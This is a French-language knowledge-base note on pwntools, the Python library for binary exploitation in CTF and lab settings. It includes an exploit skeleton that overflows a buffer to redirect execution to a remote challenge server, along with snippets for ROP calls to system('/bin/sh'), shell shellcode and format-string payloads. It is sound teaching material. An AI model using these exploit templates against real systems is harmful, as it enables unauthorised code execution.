---
titre: "pwntools"
tags: [Outils, pwn, exploit-dev, python]
source: https://github.com/Gallopsled/pwntools
---

# pwntools

**La bibliothèque Python d'exploitation binaire.** Le standard pour écrire des
exploits de pwn/CTF : interaction réseau/process, packing, ROP, shellcode, format
strings… Complète [[GEF (GDB Enhanced Features)]] (debug) côté script.

> ⚠️ Exploitation sur binaires autorisés (CTF, lab). Cf. `README`.

## Installation
```bash
pip install pwntools          # Kali : souvent déjà là
# checksec fourni par pwntools :
pwn checksec ./chall
```

## Squelette d'exploit
```python
from pwn import *

context.binary = elf = ELF('./chall')      # arch/bits auto
context.log_level = 'info'

# io = process('./chall')                   # local
io = remote('dyn-03.midnightflag.fr', 11957)  # distant

payload  = b'A' * 72                         # offset (via cyclic)
payload += p64(elf.symbols['win'])           # écrase la sauvegarde d'adresse
io.sendlineafter(b'> ', payload)
io.interactive()
```

## Briques utiles
```python
cyclic(200); cyclic_find(0x6161616c)   # trouver l'offset d'overflow
p64(x) / u64(x)                        # packing little-endian
rop = ROP(elf); rop.call('system', [next(elf.search(b'/bin/sh'))])
shellcraft.sh(); asm(shellcraft.sh())  # shellcode
fmtstr_payload(6, {addr: value})       # format string
```

## Réflexe
Développer en **local** avec `gdb.attach(io)` + [[GEF (GDB Enhanced Features)]],
puis basculer `process` → `remote`. `cyclic` pour l'offset, `checksec` pour la
stratégie. Gadgets : [[ROPgadget & ropper]].
